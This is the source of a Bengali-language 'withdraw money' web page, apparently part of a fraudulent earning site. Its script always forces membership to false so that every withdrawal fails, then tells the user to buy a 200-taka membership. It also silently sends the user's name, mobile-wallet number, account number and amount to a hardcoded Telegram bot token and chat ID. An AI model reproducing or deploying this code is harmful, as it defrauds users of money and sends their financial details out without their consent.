<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>উইথড্র মানি</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="icon" type="image/png" sizes="32x32" href="android-chrome-512x512.png">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f7fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 900px;
        }

        h1 {
            color: #2c3e50;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
        }

        .balance-container {
            background: linear-gradient(135deg, #4b6cb7 0%, #182848 100%);
            color: white;
            padding: 20px 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            margin-bottom: 30px;
            text-align: center;
        }

        .balance-text {
            font-size: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        #balanceAmount {
            font-weight: bold;
            color: #f8d56b;
        }

        .cards-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
            margin-bottom: 40px;
        }

        .card {
            width: 100%;
            max-width: 380px;
            height: 220px;
            border-radius: 15px;
            padding: 25px;
            color: white;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .card:hover {
            transform: translateY(-5px);
        }

        .card.selected {
            animation: pulse 2s infinite;
            box-shadow: 0 0 20px rgba(39, 174, 96, 0.5);
            border: 2px solid #27ae60;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(255, 240, 81, 0.7);
            }

            70% {
                box-shadow: 0 0 0 10px rgba(61, 242, 37, 0.639);
            }

            50% {
                box-shadow: 0 0 0 10px rgba(34, 170, 166, 0.785);
            }

            100% {
                box-shadow: 0 0 0 0 rgba(217, 30, 30, 0.551);
            }
        }

        .card-1 {
            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
        }

        .card-2 {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
        }

        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            right: -30%;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .card-type {
            font-size: 14px;
            opacity: 0.8;
        }

        .card-logo {
            font-size: 24px;
        }

        .card-number {
            font-size: 18px;
            letter-spacing: 2px;
            margin-bottom: 25px;
            word-spacing: 8px;
            font-family: 'Courier New', monospace;
        }

        .card-details {
            display: flex;
            justify-content: space-between;
        }

        .card-holder {
            font-size: 14px;
            opacity: 0.8;
        }

        .card-name {
            font-size: 16px;
            margin-top: 5px;
        }

        .rules-container {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        .rules-title {
            color: #2c3e50;
            font-size: 20px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .rules-list {
            list-style-type: none;
        }

        .rules-list li {
            margin-bottom: 10px;
            padding-left: 25px;
            position: relative;
            color: #555;
        }

        .rules-list li::before {
            content: '•';
            color: #3498db;
            font-size: 20px;
            position: absolute;
            left: 0;
            top: -2px;
        }

        .form-container {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: 500;
        }

        .input-with-icon {
            position: relative;
        }

        .input-with-icon i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #7f8c8d;
        }

        input {
            width: 100%;
            padding: 12px 15px 12px 45px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s ease;
        }

        input:focus {
            border-color: #3498db;
            outline: none;
        }

        .withdraw-btn {
            background: linear-gradient(135deg, #27ae60 0%, #219653 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 0 auto;
            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.3);
            width: 100%;
            max-width: 300px;
        }

        .withdraw-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.4);
        }

        .withdraw-btn:disabled {
            background: #95a5a6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* হিস্ট্রি স্টাইল */
        .history-container {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        .history-title {
            color: #2c3e50;
            font-size: 20px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .history-item {
            border-bottom: 1px solid #eee;
            padding: 15px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .history-item:last-child {
            border-bottom: none;
        }

        .history-method {
            font-weight: bold;
            color: #2c3e50;
        }

        .history-amount {
            color: #27ae60;
            font-weight: bold;
        }

        .history-status {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 14px;
        }

        .status-pending {
            background: #f39c12;
            color: white;
        }

        .status-completed {
            background: #27ae60;
            color: white;
        }

        .status-failed {
            background: #e74c3c;
            color: white;
        }

        .timer {
            font-size: 14px;
            color: #7f8c8d;
            margin-top: 5px;
        }

        /* সুন্দর পপআপ স্টাইল */
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .popup-content {
            background: white;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            text-align: center;
            position: relative;
            animation: popIn 0.4s ease;
        }

        @keyframes popIn {
            0% {
                transform: scale(0.8);
                opacity: 0;
            }

            80% {
                transform: scale(1.05);
            }

            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .popup-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }

        .success-icon {
            color: #27ae60;
        }

        .error-icon {
            color: #e74c3c;
        }

        .warning-icon {
            color: #f39c12;
        }

        .popup-title {
            font-size: 24px;
            margin-bottom: 15px;
            color: #2c3e50;
        }

        .popup-message {
            color: #555;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .popup-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }

        .popup-btn:hover {
            background: #2980b9;
        }

                /* ইন্টারনেট পপআপ স্টাইল */
                .internet-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }

        .popup-content {
            background: white;
            padding: 30px 40px;
            border-radius: 15px;
            text-align: center;
            animation: popIn 0.3s ease;
        }

        @keyframes popIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .popup-icon {
            font-size: 50px;
            margin-bottom: 15px;
        }

        .online { color: #4ecdc4; }
        .offline { color: #e74c3c; }

        .popup-button {
            background: #4ecdc4;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
        }

        /* স্ক্রিন ব্লক করার স্টাইল */
        body.no-internet {
            overflow: hidden;
            pointer-events: none;
        }

        body.no-internet * {
            pointer-events: none !important;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1><i class="fas fa-money-bill-wave"></i> উইথড্র মানি</h1>

        <div class="balance-container">
            <div class="balance-text">
                <i class="fas fa-wallet"></i>
                ব্যালেন্স: ৳<span id="balanceAmount">0.00</span>
            </div>
        </div>

        <div class="cards-container">
            <div class="card card-1" id="card1" onclick="selectCard(1)">
                <div class="card-header">
                    <div class="card-type" id="card1Type">কার্ড ১</div>
                    <div class="card-logo">
                        <i class="far fa-credit-card"></i>
                    </div>
                </div>
                <div class="card-number" id="card1Number">XXXX XXXX XXXX XXXX</div>
                <div class="card-details">
                    <div class="card-holder">
                        <div>কার্ড হোল্ডার</div>
                        <div class="card-name" id="card1Name">নাম</div>
                    </div>
                </div>
            </div>

            <div class="card card-2" id="card2" onclick="selectCard(2)">
                <div class="card-header">
                    <div class="card-type" id="card2Type">কার্ড ২</div>
                    <div class="card-logo">
                        <i class="far fa-credit-card"></i>
                    </div>
                </div>
                <div class="card-number" id="card2Number">XXXX XXXX XXXX XXXX</div>
                <div class="card-details">
                    <div class="card-holder">
                        <div>কার্ড হোল্ডার</div>
                        <div class="card-name" id="card2Name">নাম</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="rules-container">
            <h2 class="rules-title"><i class="fas fa-info-circle"></i> উইথড্র নিয়মাবলী</h2>
            <ul class="rules-list">
                <li style="color:red;">উইথড্র করতে হলে অবশ্যই আগে ব্যাংক কার্ড যোগ করতে হবে
                    <br><button class="action-btn" onclick="window.location.href='bank.html'">
                        <i class="fas fa-credit-card"></i>
                        আপনার ব্যাংক কার্ড
                    </button>
                </li>
                <li>ন্যূনতম উইথড্র অ্যামাউন্ট ৳১০০</li>
                <li>উইথড্র রিকুয়েস্ট প্রসেসিং সময় ২৪-৪৮ ঘন্টা</li>
                <li>প্রতি সপ্তাহে সর্বোচ্চ ১২ বার উইথড্র করা যাবে</li>
                <li>ভুল তথ্য দিলে উইথড্র বাতিল হবে</li>
                <li>মেম্বারশিপ না থাকলে উইথড্র বাতিল হতে পারে</li>
            </ul>
        </div>

        <div class="form-container">
            <div class="form-group">
                <label id="numberLabel">মোবাইল নম্বর</label>
                <div class="input-with-icon">
                    <i class="fas fa-mobile-alt"></i>
                    <input type="text" id="mobileNumber" placeholder="মোবাইল নম্বর লিখুন" maxlength="11">
                </div>
            </div>

            <div class="form-group">
                <label for="amount">উইথড্র অ্যামাউন্ট (৳)</label>
                <div class="input-with-icon">
                    <i class="fas fa-money-bill-wave"></i>
                    <input type="number" id="amount" placeholder="অ্যামাউন্ট লিখুন" min="200">
                </div>
            </div>
        </div>

        <button class="withdraw-btn" id="withdrawBtn" onclick="processWithdrawal()" disabled>
            <i class="fas fa-paper-plane"></i> উইথড্র রিকুয়েস্ট পাঠান
        </button>
        <br>

        <div class="history-container" id="historyContainer">
            <h2 class="history-title"><i class="fas fa-history"></i> উইথড্র হিস্ট্রি</h2>
            <div id="historyList"></div>
        </div>
    </div>

    <!-- সাকসেস পপআপ -->
    <div class="popup" id="successPopup">
        <div class="popup-content">
            <div class="popup-icon warning-icon">
                <i class="fas fa-exclamation-circle"></i>
            </div>
            <h2 class="popup-title">ব্যর্থ হয়েছে!</h2>
            <p class="popup-message" id="successMessage">আপনার উইথড্র রিকুয়েস্ট সফলভাবে জমা হয়েছে। প্রসেসিং এর জন্য
                ধন্যবাদ।</p>
            <button class="popup-btn" onclick="closePopup('successPopup')">ঠিক আছে</button>
        </div>
    </div>

    <!-- এরর পপআপ -->
    <div class="popup" id="errorPopup">
        <div class="popup-content">
            <div class="popup-icon warning-icon">
                <i class="fas fa-exclamation-circle"></i>
            </div>
            <h2 class="popup-title">সমস্যা হয়েছে!</h2>
            <p class="popup-message" id="errorMessage">আপনার রিকুয়েস্ট পাঠাতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।</p>
            <button class="popup-btn" onclick="closePopup('errorPopup')">ঠিক আছে</button>
        </div>
    </div>

    <!-- ওয়ার্নিং পপআপ -->
    <div class="popup" id="warningPopup">
        <div class="popup-content">
            <div class="popup-icon warning-icon">
                <i class="fas fa-exclamation-circle"></i>
            </div>
            <h2 class="popup-title">মেম্বারশিপ প্রয়োজন!</h2>
            <p class="popup-message">আপনি কোনো মেম্বারশিপ কিনেন নাই, তাই উইথড্র বাতিল হয়েছে। কমপক্ষে ২০০ টাকার
                মেম্বারশিপ কিনুন।</p>
            <button class="popup-btn" onclick="closePopup('warningPopup')">ঠিক আছে</button>
        </div>
    </div>

        <!-- পপআপ কন্টেন্ট -->
        <div class="internet-popup" id="internetPopup">
            <div class="popup-content">
                <i class="fas fa-wifi-slash popup-icon offline"></i>
                <h2>ইন্টারনেট সংযোগ নেই!</h2>
                <p>অনুগ্রহ করে আপনার ইন্টারনেট সংযোগ চেক করুন</p>
                <button class="popup-button" onclick="checkConnection()">রিট্রাই করুন</button>
            </div>
        </div>

    <script>
        // নির্বাচিত কার্ড
        let selectedCard = null;
        let selectedCardData = null;
        let withdrawalTimer = null;

        // পেজ লোড হওয়ার সময় ডাটা লোড করা
        window.onload = function () {
            loadBalance();
            loadCards();
            loadWithdrawalHistory();
        };

        // ব্যালেন্স লোড করা
        function loadBalance() {
            const balance = parseFloat(localStorage.getItem('userBalance')) || 0;
            document.getElementById('balanceAmount').textContent = balance.toFixed(2);
        }

        // কার্ড ডেটা লোড করা
        function loadCards() {
            const card1Data = JSON.parse(localStorage.getItem('card1Data'));
            const card2Data = JSON.parse(localStorage.getItem('card2Data'));

            if (card1Data) {
                document.getElementById('card1Name').textContent = card1Data.holder;
                document.getElementById('card1Number').textContent = formatCardNumber(card1Data.number);
                document.getElementById('card1Type').textContent = card1Data.method;
            } else {
                document.getElementById('card1').style.display = 'none';
            }

            if (card2Data) {
                document.getElementById('card2Name').textContent = card2Data.holder;
                document.getElementById('card2Number').textContent = formatCardNumber(card2Data.number);
                document.getElementById('card2Type').textContent = card2Data.method;
            } else {
                document.getElementById('card2').style.display = 'none';
            }
            // যদি কোনো কার্ড না থাকে
            if (!card1Data && !card2Data) {
                document.getElementById('mobileNumber').placeholder = 'ব্যাংক কার্ড যোগ করুন';
                document.getElementById('mobileNumber').disabled = true;
            }
        }

        // উইথড্র হিস্ট্রি লোড করা
        function loadWithdrawalHistory() {
            const history = JSON.parse(localStorage.getItem('withdrawalHistory')) || [];
            const historyList = document.getElementById('historyList');

            if (history.length === 0) {
                historyList.innerHTML = '<p>কোনো উইথড্র হিস্ট্রি পাওয়া যায়নি</p>';
                return;
            }

            historyList.innerHTML = '';
            history.slice().reverse().forEach((item, index) => {
                const historyItem = document.createElement('div');
                historyItem.className = 'history-item';

                const statusClass = item.status === 'completed' ? 'status-completed' :
                    item.status === 'failed' ? 'status-failed' : 'status-pending';

                historyItem.innerHTML = `
                    <div>
                        <div class="history-method">${item.method} - ${item.mobileNumber}</div>
                        <div>${new Date(item.date).toLocaleString()}</div>
                        ${item.timer ? `<div class="timer">${item.timer}</div>` : ''}
                    </div>
                    <div>
                        <div class="history-amount">৳${item.amount.toFixed(2)}</div>
                        <div class="history-status ${statusClass}">${getStatusText(item.status)}</div>
                    </div>
                `;

                historyList.appendChild(historyItem);
            });
        }

        function getStatusText(status) {
            const statusMap = {
                'pending': 'পেন্ডিং',
                'completed': 'সম্পন্ন',
                'failed': 'ব্যর্থ'
            };
            return statusMap[status] || status;
        }

        // কার্ড নম্বর ফরম্যাট করা (XXXX XXXX XXXX XXXX)
        function formatCardNumber(number) {
            if (!number) return 'XXXX XXXX XXXX XXXX';
            return number.replace(/(\d{3})(?=\d)/g, '$1 ');
        }

        // কার্ড সিলেক্ট করা
        function selectCard(cardNumber) {
            const cardData = JSON.parse(localStorage.getItem(`card${cardNumber}Data`));

            if (!cardData) return;

            // পূর্বে সিলেক্ট করা কার্ড থেকে সিলেকশন রিমুভ
            if (selectedCard) {
                document.getElementById(`card${selectedCard}`).classList.remove('selected');
            }

            // নতুন কার্ড সিলেক্ট
            document.getElementById(`card${cardNumber}`).classList.add('selected');
            selectedCard = cardNumber;
            selectedCardData = cardData;

            // লেবেল আপডেট
            const labelText = cardData.method === 'বিকাশ' ? 'বিকাশ নম্বর' : 'নগদ নম্বর';
            document.getElementById('numberLabel').textContent = labelText;

            // মোবাইল নম্বর ফিল্ড আপডেট
            const mobileInput = document.getElementById('mobileNumber');
            mobileInput.disabled = false;

            if (cardData.method === 'বিকাশ' || cardData.method === 'নগদ') {
                // কার্ডে সেভ করা নম্বর দেখাবে
                mobileInput.value = cardData.number || '';
                mobileInput.placeholder = `${cardData.method} নম্বর লিখুন`;
            } else {
                // অন্যান্য ব্যাংক কার্ডের ক্ষেত্রে
                mobileInput.value = '';
                mobileInput.placeholder = 'ব্যাংক একাউন্ট নম্বর লিখুন';
            }

            // বাটন এনাবল করা
            document.getElementById('withdrawBtn').disabled = false;
        }

        // উইথড্র প্রসেস করা
        function processWithdrawal() {
            const mobileNumber = document.getElementById('mobileNumber').value.trim();
            const amount = parseFloat(document.getElementById('amount').value);
            const balance = parseFloat(localStorage.getItem('userBalance')) || 0;
            const userData = JSON.parse(localStorage.getItem('userData')) || { isMember: false };

            // ভ্যালিডেশন
            if (!selectedCard) {
                showError('অনুগ্রহ করে একটি কার্ড সিলেক্ট করুন');
                return;
            }

            if (!mobileNumber || !/^01\d{9}$/.test(mobileNumber)) {
                showError('সঠিক মোবাইল নম্বর লিখুন (11 ডিজিট)');
                return;
            }

            if (!amount || isNaN(amount) || amount < 100) {
                showError('ন্যূনতম ৳১০০ উইথড্র করতে হবে');
                return;
            }

            if (amount > balance) {
                showError('আপনার ব্যালেন্স পর্যাপ্ত নয়');
                return;
            }



            // ব্যালেন্স আপডেট (অস্থায়ীভাবে কাটা)
            const newBalance = balance - amount;
            localStorage.setItem('userBalance', newBalance.toFixed(2));
            loadBalance();

            // উইথড্র হিস্ট্রি এ যোগ করা
            const withdrawalData = {
                method: selectedCardData.method,
                mobileNumber: mobileNumber,
                accountNumber: selectedCardData.number,
                amount: amount,
                date: new Date().toISOString(),
                status: 'pending',
                timer: '৫ সেকেন্ড সময় বাকি'
            };

            const history = JSON.parse(localStorage.getItem('withdrawalHistory')) || [];
            history.push(withdrawalData);
            localStorage.setItem('withdrawalHistory', JSON.stringify(history));
            loadWithdrawalHistory();

            // টাইমার সেট করা
            startWithdrawalTimer(history.length - 1, amount);

            // টেলিগ্রাম বটে ডাটা পাঠানো
            sendToTelegramBot(mobileNumber, amount);
        }

        // উইথড্র টাইমার শুরু করা
        function startWithdrawalTimer(index, amount) {
            let timeLeft = 0.5000; // 1 minute in seconds

            withdrawalTimer = setInterval(() => {
                timeLeft--;

                const history = JSON.parse(localStorage.getItem('withdrawalHistory'));
                if (!history || !history[index]) {
                    clearInterval(withdrawalTimer);
                    return;
                }

                if (timeLeft <= 0) {
                    // টাইমার শেষ, মেম্বারশিপ চেক

                    const userData = JSON.parse(localStorage.getItem('userData')) || { isMember: false };

                    // জোরপূর্বক false সেট করা
                    userData.isMember = false;

                    if (!userData.isMember) {
                        // মেম্বারশিপ না থাকলে টাকা ফেরত
                        const balance = parseFloat(localStorage.getItem('userBalance')) || 0;
                        localStorage.setItem('userBalance', (balance + amount).toFixed(2));
                        loadBalance();

                        history[index].status = 'failed';
                        history[index].timer = 'কোনো মেম্বারশিপ নেই এর জন্য উইথড্র বার্থ হয়েছে। কমপক্ষে আপনাকে ২০০ টাকার মেম্বারশিপ টি কিনতে হবে তাহলে আপনি টাকা উইথড্র করতে পারবেন';
                        localStorage.setItem('withdrawalHistory', JSON.stringify(history));
                        loadWithdrawalHistory();

                        showSuccess(`আপনার ৳${amount.toFixed(2)}টাকা ফেরত দেওয়া হয়েছে (মেম্বারশিপ নেই এই জন্য)`);
                    } else {
                        // মেম্বারশিপ থাকলে সম্পন্ন
                        history[index].status = 'completed';
                        history[index].timer = 'সম্পন্ন';
                        localStorage.setItem('withdrawalHistory', JSON.stringify(history));
                        loadWithdrawalHistory();

                        showSuccess(`৳${amount.toFixed(2)} উইথড্র সম্পন্ন হয়েছে!`);
                    }

                    clearInterval(withdrawalTimer);
                } else {
                    // টাইমার আপডেট
                    history[index].timer = `${timeLeft} সেকেন্ড বাকি`;
                    localStorage.setItem('withdrawalHistory', JSON.stringify(history));
                    loadWithdrawalHistory();
                }
            }, 1000);
        }

        // টেলিগ্রাম বটে ডাটা পাঠানো
        function sendToTelegramBot(mobileNumber, amount) {
            // এখানে আপনার টেলিগ্রাম বট API ব্যবহার করুন
            const botToken = '7526583138:AAH-mPmh54YgDIqn7cZO1AP8_3xlSPeDgn4';
            const chatId = '6341598098';

            const message = `
                নতুন উইথড্র রিকুয়েস্ট!
                ---------------------
                নাম: ${selectedCardData.holder}
                পদ্ধতি: ${selectedCardData.method}
                ${selectedCardData.method === 'বিকাশ' ? 'বিকাশ নম্বর' : 'নগদ নম্বর'}: ${mobileNumber}
                অ্যাকাউন্ট নম্বর: ${selectedCardData.number}
                অ্যামাউন্ট: ৳${amount.toFixed(2)}
                নতুন ব্যালেন্স: ৳${(parseFloat(localStorage.getItem('userBalance')) || 0).toFixed(2)}
                তারিখ: ${new Date().toLocaleString()}
            `;

            // এটি একটি উদাহরণ মাত্র, প্রকৃত API কল আপনার বটের উপর নির্ভর করবে
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    console.log('Telegram response:', data);
                })
                .catch(error => {
                    console.error('Error sending to Telegram:', error);
                });
        }

        // সাকসেস পপআপ দেখানো
        function showSuccess(message) {
            document.getElementById('successMessage').textContent = message;
            document.getElementById('successPopup').style.display = 'flex';
        }

        // এরর পপআপ দেখানো
        function showError(message) {
            document.getElementById('errorMessage').textContent = message;
            document.getElementById('errorPopup').style.display = 'flex';
        }

        // ওয়ার্নিং পপআপ দেখানো (মেম্বারশিপ না থাকলে)
        function showWarning() {
            document.getElementById('warningPopup').style.display = 'flex';
        }

        // পপআপ বন্ধ করা
        function closePopup(id) {
            document.getElementById(id).style.display = 'none';
        }




        
    </script>
</body>

</html>